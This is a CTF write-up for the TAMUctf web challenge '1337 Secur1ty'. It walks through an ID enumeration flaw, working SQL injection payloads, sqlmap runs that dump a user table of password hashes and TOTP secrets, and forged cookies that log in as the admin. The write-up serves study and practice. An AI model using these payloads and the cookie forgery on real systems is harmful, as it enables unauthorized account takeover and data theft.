# 1337 Secur1ty
Web, 485 points

## Description:

A website with a registration form and a login form was linked to.

```html
<div id="Login" class="tabcontent">
    <form id='login' action='login' method='POST' accept-charset='UTF-8'>
        <fieldset style="width:25%">
            <legend>Login</legend>

            <label for='username'> Username:</label>
            <br>
            <input type='text' name='username' id='username' maxlength="20" required oninvalid="this.setCustomValidity('Please Enter Username')" oninput="this.setCustomValidity('')"/>

            <br><br>
            <label for='password'>Password:</label>
            <br>
            <input type='password' name='password' id='password' maxlength="50" required oninvalid="this.setCustomValidity('Please Enter Password')" oninput="this.setCustomValidity('')"/>
            <br><br>

            <label for='totp'>TOTP Code:</label>
            <br>
            <input type='password' name='totp' id='totp' maxlength="6" required oninvalid="this.setCustomValidity('Please Enter TOTP Code')" oninput="this.setCustomValidity('')"/>
            <br><br>

            <input type='Submit' name='Submit' value='Login' />
        </fieldset>
    </form>
</div>
<div id="Register" class="tabcontent">
    <form id='register-user' action='register_user' method='POST' accept-charset='UTF-8'>
        <fieldset style="width:25%">
            <legend>Register User</legend>

            <label for='firstname'>First Name:</label>
            <br>
            <input type='text' name='firstname' id='firstname' maxlength="10" pattern = "[a-zA-Z]+" required oninvalid="this.setCustomValidity('Please Enter First Name')" oninput="this.setCustomValidity('')"/>

            <br><br>
            <label for='lastname'>Last Name:</label>
            <br>
            <input type='text' name='lastname' id='lastname' maxlength="15" pattern = "[a-zA-Z]+" required oninvalid="this.setCustomValidity('Please Enter Last Name')" oninput="this.setCustomValidity('')"/>

            <br><br>
            <label for='password'>Password:</label>
            <br>
            <input type='password' name='password' id='password' maxlength="50" required oninvalid="this.setCustomValidity('Please Enter Password')" oninput="this.setCustomValidity('')"/>

            <br><br>
            <label for='password'>Phone Number:</label>
            <br>
            <input type="tel" id="phone" name="phone" pattern="[0-9]{10}" oninvalid="this.setCustomValidity('Please Enter Correct Phone # - ex. 1234567891')" oninput="this.setCustomValidity('')">

            <br><br>
            <input type='Submit' name='Submit' value="Register"/>
        </fieldset>
        <b>*** UPON REGISTRATION, ADD QR-CODE TO GOOGLE AUTHENTICATOR APP! ***</b>
    </form>
</div>
```

## Solution:

We start by registering to the service:
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl -v "http://web6.tamuctf.com/register_user" -X POST --data "firstname=a&lastname=a&password=a&phone=1234567891&Submit=Register"
Note: Unnecessary use of -X or --request, POST is already inferred.
*   Trying 34.208.211.186...
* TCP_NODELAY set
* Connected to web6.tamuctf.com (34.208.211.186) port 80 (#0)
> POST /register_user HTTP/1.1
> Host: web6.tamuctf.com
> User-Agent: curl/7.61.0
> Accept: */*
> Content-Length: 66
> Content-Type: application/x-www-form-urlencoded
>
* upload completely sent off: 66 out of 66 bytes
< HTTP/1.1 302 Found
< Server: nginx/1.15.8
< Date: Tue, 12 Mar 2019 19:49:56 GMT
< Content-Type: text/html; charset=UTF-8
< Content-Length: 0
< Connection: keep-alive
< Set-Cookie: userid=3; path=/
< Set-Cookie: secret=TKH4FPK7FOEXG7VW; path=/
< Location: /
<
* Connection #0 to host web6.tamuctf.com left intact
```

Note that we received two cookies: `userid` and `secret`.
We'll return to them later, but first let's take a look around and see what registered users can access.

The main page contains three tabs.

The first tab contains the user profile:
```
Name: a a
Username: aa
Phone: 123-456-7891
Email: aa@1337secur1ty.hak
Account Created On: 03/12/19 19:49
Description:
```

In addition, there's a link to a QR code:
```
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# zbarimg a.png
QR-Code:otpauth://totp/TAMU_CTF?secret=TKH4FPK7FOEXG7VW
scanned 1 barcode symbols from 1 images in 0.17 seconds
```

The secret is identical to the one in the cookie, and in general this is a format that belongs to a Time-based One-time Password protocol, like the ones used by major services for 2 Factor Authentication.

There are mobile applications such as Google Authenticator that upon scanning the QR code, will provide a time-based one-time-password needed in order to login to the application. A web-based alternative can be found [here](https://gauth.apps.gbraad.nl/#main).

Back to the website. Another tab contains the "messages" page, which has a single message:
```
http://web6.tamuctf.com/message?id=2

From: Joe (1337-admin)
Date: 03/12/19
Time: 19:49
Message:
Welcome to 1337 Secur1ty, the family that you want to work at 16 hours a day. Because here at 1337 Secur1ty, we care!
```

Last but not least, there is an "Employees" tab with the following information:
```
ID	Username	Name            Email	                        Phone          Joined
1	1337-admin	Joe Joeson	1337-admin@l337secur1ty.hak	*	        03/12/19 19:42
2	ScrubLord	Bob Bobson	ScrubLord@l337secur1ty.hak	*	        03/12/19 19:42
3	aa	        a a	        aa@1337secur1ty.hak	        123-456-7891	03/12/19 19:49
```

Reading a bit about the OTP protocol, I discovered that [the "secret" is simply a base32 encoded value](https://github.com/google/google-authenticator/wiki/Key-Uri-Format). My initial thought was that it was based on the time that the user joined, and since we had this information in the Employees page, we needed to figure out how to generate a secret identical to the Admin's.

However, after registering several users and comparing their secrets, I couldn't find any obvious pattern.

Therefore, I went back to the "messages" page, and attempted to access other messages by modifying the URI parameter.

Changing the ID to "1" revealed the following message:
```
From: Bob (ScrubLord)
Date: 03/12/19
Time: 19:42
Message:
Please don't blow off the meeting today, we need to talk about the cookies.
```

As we saw, the cookie contains a `userid` and a `secret`. We can replace them with other values, but what should they be?

Searching for some other vulnerability in the website, I tried:
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl "http://web6.tamuctf.com/message?id='"
Brought to you by the 1337est of Secur1ty!!!
```

It looked like they has some kind of protection against SQL injection, since this message wasn't the regular response for invalid IDs:
```
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl "http://web6.tamuctf.com/message?id=f"
<b>From:</b>  ()<br><b>Date:</b> //<br><b>Time:</b> <br><b>Message:</b> <br style='margin-bottom:10px;'><br><br><button id='back'>Back</button><script type='text/javascript'>document.getElementById('back').onclick = function () {location.href = '/';};</script>
```

However a slightly more complex value hinted that an SQLi vulnerability is indeed hiding behind the service:
```console
/media/sf_CTFs/tamu/1337_Secur1ty# curl "http://web6.tamuctf.com/message?id=1'%20and%20'1'='1"
<b>From:</b> Bob (ScrubLord)<br><b>Date:</b> 03/12/19<br><b>Time:</b> 19:42<br><b>Message:</b> <br style='margin-bottom:10px;'>Please don't blow off the meeting today, we need to talk about the cookies.<br><br><button id='back'>Back</button><script type='text/javascript'>document.getElementById('back').onclick = function () {location.href = '/';};</script>
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl "http://web6.tamuctf.com/message?id=1'%20and%20'2'='1"
<b>From:</b>  ()<br><b>Date:</b> //<br><b>Time:</b> <br><b>Message:</b> <br style='margin-bottom:10px;'><br><br><button id='back'>Back</button><script type='text/javascript'>document.getElementById('back').onclick = function () {location.href = '/';};</script>
```

Time to fire up SQLMap:
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# sqlmap -u http://web6.tamuctf.com/message?id=2
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.2.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [']_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 13:11:46

[13:11:47] [INFO] testing connection to the target URL
[13:11:47] [INFO] checking if the target is protected by some kind of WAF/IPS/IDS
[13:11:48] [INFO] testing if the target URL content is stable
[13:11:48] [INFO] target URL content is stable
[13:11:48] [INFO] testing if GET parameter 'id' is dynamic
[13:11:48] [INFO] confirming that GET parameter 'id' is dynamic
[13:11:48] [INFO] GET parameter 'id' is dynamic
[13:11:49] [WARNING] heuristic (basic) test shows that GET parameter 'id' might not be injectable
[13:11:50] [INFO] testing for SQL injection on GET parameter 'id'
[13:11:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[13:11:53] [INFO] GET parameter 'id' appears to be 'AND boolean-based blind - WHERE or HAVING clause' injectable (with --string="we")
[13:11:56] [INFO] heuristic (extended) test shows that the back-end DBMS could be 'MySQL'
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] y
[13:12:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (BIGINT UNSIGNED)'
[13:12:04] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (BIGINT UNSIGNED)'
[13:12:04] [INFO] testing 'MySQL >= 5.5 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXP)'
[13:12:05] [INFO] testing 'MySQL >= 5.5 OR error-based - WHERE or HAVING clause (EXP)'
[13:12:05] [INFO] testing 'MySQL >= 5.7.8 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (JSON_KEYS)'
[13:12:05] [INFO] testing 'MySQL >= 5.7.8 OR error-based - WHERE or HAVING clause (JSON_KEYS)'
[13:12:06] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:12:06] [INFO] testing 'MySQL >= 5.0 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:12:06] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:12:06] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[13:12:07] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:12:07] [INFO] testing 'MySQL >= 5.1 OR error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (UPDATEXML)'
[13:12:07] [INFO] testing 'MySQL >= 4.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (FLOOR)'
[13:12:08] [INFO] testing 'MySQL >= 4.1 OR error-based - WHERE or HAVING clause (FLOOR)'
[13:12:08] [INFO] testing 'MySQL OR error-based - WHERE or HAVING clause (FLOOR)'
[13:12:09] [INFO] testing 'MySQL >= 5.1 error-based - PROCEDURE ANALYSE (EXTRACTVALUE)'
[13:12:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (BIGINT UNSIGNED)'
[13:12:09] [INFO] testing 'MySQL >= 5.5 error-based - Parameter replace (EXP)'
[13:12:09] [INFO] testing 'MySQL >= 5.7.8 error-based - Parameter replace (JSON_KEYS)'
[13:12:09] [INFO] testing 'MySQL >= 5.0 error-based - Parameter replace (FLOOR)'
[13:12:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (UPDATEXML)'
[13:12:09] [INFO] testing 'MySQL >= 5.1 error-based - Parameter replace (EXTRACTVALUE)'
[13:12:09] [INFO] testing 'MySQL inline queries'
[13:12:09] [INFO] testing 'MySQL > 5.0.11 stacked queries (comment)'
[13:12:10] [INFO] testing 'MySQL > 5.0.11 stacked queries'
[13:12:10] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP - comment)'
[13:12:10] [INFO] testing 'MySQL > 5.0.11 stacked queries (query SLEEP)'
[13:12:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query - comment)'
[13:12:11] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
[13:12:11] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind'
[13:12:22] [INFO] GET parameter 'id' appears to be 'MySQL >= 5.0.12 AND time-based blind' injectable
[13:12:22] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[13:12:22] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[13:12:23] [INFO] 'ORDER BY' technique appears to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
[13:12:24] [INFO] target URL appears to have 6 columns in query
[13:12:29] [INFO] GET parameter 'id' is 'Generic UNION query (NULL) - 1 to 20 columns' injectable
GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] n
sqlmap identified the following injection point(s) with a total of 71 HTTP(s) requests:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 9974=9974 AND 'Xjtp'='Xjtp

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=2' AND SLEEP(5) AND 'BISW'='BISW

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-1437' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7871,0x7976526e7667585057775948464a614a44427758585a6442564e75716b434452534247514b516a43,0x716b7a6271),NULL,NULL,NULL-- QTjl
---
[13:12:34] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12
[13:12:34] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web6.tamuctf.com'

[*] shutting down at 13:12:34

```

SQLMap confirmed that the service is vulnerable. Let's extract the data:
```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# sqlmap -u http://web6.tamuctf.com/message?id=2 --dbs
        ___
       __H__
 ___ ___[']_____ ___ ___  {1.2.5#stable}
|_ -| . [']     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 13:13:54

[13:13:54] [INFO] resuming back-end DBMS 'mysql'
[13:13:54] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 9974=9974 AND 'Xjtp'='Xjtp

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=2' AND SLEEP(5) AND 'BISW'='BISW

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-1437' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7871,0x7976526e7667585057775948464a614a44427758585a6442564e75716b434452534247514b516a43,0x716b7a6271),NULL,NULL,NULL-- QTjl
---
[13:13:55] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12
[13:13:55] [INFO] fetching database names
[13:13:55] [INFO] used SQL query returns 2 entries
[13:13:55] [INFO] retrieved: information_schema
[13:13:56] [INFO] retrieved: 1337_Secur1ty
available databases [2]:
[*] 1337_Secur1ty
[*] information_schema

[13:13:56] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web6.tamuctf.com'

[*] shutting down at 13:13:56



root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# sqlmap -u http://web6.tamuctf.com/message?id=2 -D 1337_Secur1ty --tables
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.5#stable}
|_ -| . [']     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 13:14:21

[13:14:21] [INFO] resuming back-end DBMS 'mysql'
[13:14:21] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 9974=9974 AND 'Xjtp'='Xjtp

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=2' AND SLEEP(5) AND 'BISW'='BISW

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-1437' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7871,0x7976526e7667585057775948464a614a44427758585a6442564e75716b434452534247514b516a43,0x716b7a6271),NULL,NULL,NULL-- QTjl
---
[13:14:22] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12
[13:14:22] [INFO] fetching tables for database: '1337_Secur1ty'
[13:14:22] [INFO] used SQL query returns 2 entries
[13:14:22] [INFO] retrieved: Messages
[13:14:22] [INFO] retrieved: Users
Database: 1337_Secur1ty
[2 tables]
+----------+
| Messages |
| Users    |
+----------+

[13:14:23] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web6.tamuctf.com'

[*] shutting down at 13:14:23


root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# sqlmap -u http://web6.tamuctf.com/message?id=2 -D 1337_Secur1ty -T Users --dump
        ___
       __H__
 ___ ___[(]_____ ___ ___  {1.2.5#stable}
|_ -| . ["]     | .'| . |
|___|_  [)]_|_|_|__,|  _|
      |_|V          |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting at 13:14:47

[13:14:47] [INFO] resuming back-end DBMS 'mysql'
[13:14:48] [INFO] testing connection to the target URL
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: id (GET)
    Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: id=2' AND 9974=9974 AND 'Xjtp'='Xjtp

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind
    Payload: id=2' AND SLEEP(5) AND 'BISW'='BISW

    Type: UNION query
    Title: Generic UNION query (NULL) - 6 columns
    Payload: id=-1437' UNION ALL SELECT NULL,NULL,CONCAT(0x71766b7871,0x7976526e7667585057775948464a614a44427758585a6442564e75716b434452534247514b516a43,0x716b7a6271),NULL,NULL,NULL-- QTjl
---
[13:14:48] [INFO] the back-end DBMS is MySQL
web application technology: Nginx
back-end DBMS: MySQL >= 5.0.12
[13:14:48] [INFO] fetching columns for table 'Users' in database '1337_Secur1ty'
[13:14:48] [INFO] used SQL query returns 10 entries
[13:14:49] [INFO] retrieved: "UserID","int(9)"
[13:14:49] [INFO] retrieved: "Username","varchar(20)"
[13:14:49] [INFO] retrieved: "Password","varchar(50)"
[13:14:50] [INFO] retrieved: "FirstName","varchar(10)"
[13:14:50] [INFO] retrieved: "LastName","varchar(15)"
[13:14:50] [INFO] retrieved: "Phone","varchar(10)"
[13:14:51] [INFO] retrieved: "Email","varchar(37)"
[13:14:51] [INFO] retrieved: "Description","varchar(200)"
[13:14:51] [INFO] retrieved: "CreateDate","datetime"
[13:14:52] [INFO] retrieved: "Secret","varchar(50)"
[13:14:52] [INFO] fetching entries for table 'Users' in database '1337_Secur1ty'
[13:14:52] [INFO] used SQL query returns 3 entries
[13:14:52] [INFO] retrieved: "2019-03-09 11:02:22","Most secure admin to ever grace existence.","1337-admin@l337secur1ty.hak","Joe","Joeson","02ca0b0603222a090fe2fbf3ba97d90c","","W...
[13:14:53] [INFO] retrieved: "2019-03-09 11:02:22","That random intern.","ScrubLord@l337secur1ty.hak","Bob","Bobson","fc8b8be2abe4a79bf6f36eee484c1f08","","4VCLO52ALSUUO5OM","2","Sc...
[13:14:53] [INFO] retrieved: "2019-03-09 11:06:15","","aa@1337secur1ty.hak","a","a","0cc175b9c0f1b6a831c399e269772661","1234567891","TKH4FPK7FOEXG7VW","3","aa"
[13:14:53] [INFO] recognized possible password hashes in column 'Password'
do you want to store hashes to a temporary file for eventual further processing with other tools [y/N] y
[13:15:03] [INFO] writing hashes to a temporary file '/tmp/sqlmaprdJTp31805/sqlmaphashes-Awosz3.txt'
do you want to crack them via a dictionary-based attack? [Y/n/q] y
[13:15:07] [INFO] using hash method 'md5_generic_passwd'
what dictionary do you want to use?
[1] default dictionary file '/usr/share/sqlmap/txt/wordlist.zip' (press Enter)
[2] custom dictionary file
[3] file with list of dictionary files
>
[13:15:13] [INFO] using default dictionary
do you want to use common password suffixes? (slow!) [y/N] n
[13:15:18] [INFO] starting dictionary-based cracking (md5_generic_passwd)
[13:15:18] [WARNING] multiprocessing hash cracking is currently not supported on this platform
[13:15:27] [INFO] cracked password 'a' for user 'aa'
Database: 1337_Secur1ty
Table: Users
[3 entries]
+--------+------------+-----------------------------+------------------+------------+----------+--------------------------------------+-----------+---------------------+--------------------------------------------+
| UserID | Phone      | Email                       | Secret           | Username   | LastName | Password                             | FirstName | CreateDate          | Description                                |
+--------+------------+-----------------------------+------------------+------------+----------+--------------------------------------+-----------+---------------------+--------------------------------------------+
| 1      | <blank>    | 1337-admin@l337secur1ty.hak | WIFHXDZ3BOHJMJSC | 1337-admin | Joeson   | 02ca0b0603222a090fe2fbf3ba97d90c     | Joe       | 2019-03-09 11:02:22 | Most secure admin to ever grace existence. |
| 2      | <blank>    | ScrubLord@l337secur1ty.hak  | 4VCLO52ALSUUO5OM | ScrubLord  | Bobson   | fc8b8be2abe4a79bf6f36eee484c1f08     | Bob       | 2019-03-09 11:02:22 | That random intern.                        |
| 3      | 1234567891 | aa@1337secur1ty.hak         | TKH4FPK7FOEXG7VW | aa         | a        | 0cc175b9c0f1b6a831c399e269772661 (a) | a         | 2019-03-09 11:06:15 | <blank>                                    |
+--------+------------+-----------------------------+------------------+------------+----------+--------------------------------------+-----------+---------------------+--------------------------------------------+

[13:16:09] [INFO] table '`1337_Secur1ty`.Users' dumped to CSV file '/root/.sqlmap/output/web6.tamuctf.com/dump/1337_Secur1ty/Users.csv'
[13:16:09] [INFO] fetched data logged to text files under '/root/.sqlmap/output/web6.tamuctf.com'

[*] shutting down at 13:16:09

```

We have the username, secret and hash of the password for each of the users. SQLMap was even able to crack the hash of our user. So if we can crack the hash of the admin, we have everything we need in order to sign in as admins ourselves. 

But is there an easier way? What if we replace our cookie values with the admin's values?

```console
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl --cookie "secret=WIFHXDZ3BOHJMJSC;userid=1" http://web6.tamuctf.com/
...
                <div id="Profile" class="tabcontent">
                <img src="https://chart.googleapis.com/chart?chs=200x200&chld=M|0&cht=qr&chl=otpauth%3A%2F%2Ftotp%2FTAMU_CTF%3Fsecret%3DWIFHXDZ3BOHJMJSC" align="right"/>
                <b>Name:</b> Joe Joeson<br style='margin-bottom:10px'>
                <b>Username:</b> 1337-admin<br style='margin-bottom:10px'>
                <b>Phone:</b> *<br style='margin-bottom:10px'>
                <b>Email:</b> 1337-admin@l337secur1ty.hak<br style='margin-bottom:10px'>
                <b>Account Created On:</b> 03/09/19 11:02<br style='margin-bottom:10px'>
                <b>Description:</b> Most secure admin to ever grace existence.<br style='margin-bottom:10px'>
                <b>Flag:</b> gigem{th3_T0tp_1s_we4k_w1tH_yoU}<br><br>                       
...
root@kali:/media/sf_CTFs/tamu/1337_Secur1ty# curl -s --cookie "secret=WIFHXDZ3BOHJMJSC;userid=1" http://web6.tamuctf.com/ | egrep -o "gigem{[^}]+}"
gigem{th3_T0tp_1s_we4k_w1tH_yoU}
```

Looks like breaking the hash wasn't needed at all (although it wasn't a hard task either - `02ca0b0603222a090fe2fbf3ba97d90c = md5(secretpasscode)`).